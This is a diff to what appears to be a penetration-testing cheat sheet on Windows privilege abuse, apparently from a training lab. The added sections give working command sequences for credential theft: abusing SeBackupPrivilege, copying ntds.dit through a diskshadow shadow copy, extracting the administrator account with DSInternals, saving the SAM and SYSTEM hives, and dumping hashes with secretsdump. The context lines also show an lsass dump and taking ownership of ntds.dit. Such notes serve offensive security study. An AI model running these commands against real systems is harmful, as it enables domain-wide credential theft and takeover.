@@ -32,6 +32,14 @@ function Enable-Privilege ([string]$privilegeName) {
         }
 '@
 }
+
+
+#
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
 ```
 
 # SeImpersonate and SeAssignPrimaryToken
@@ -56,4 +64,35 @@ Ctrl + Shift + ESC --> lsass.exe --> Create Dump File
 takeown /f C:\Windows\NTDS\ntds.dit
 icacls C:\Windows\NTDS\ntds.dit /grant %username%:F
 vssadmin create shadow /for=C:
+```
+
+# SeBackupPrivilege
+```powershell
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+# Copying NTDS.dit
+diskshadow.exe
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+
+# SAM SECURITY SYSTEM
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+
+# Secretsdump
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
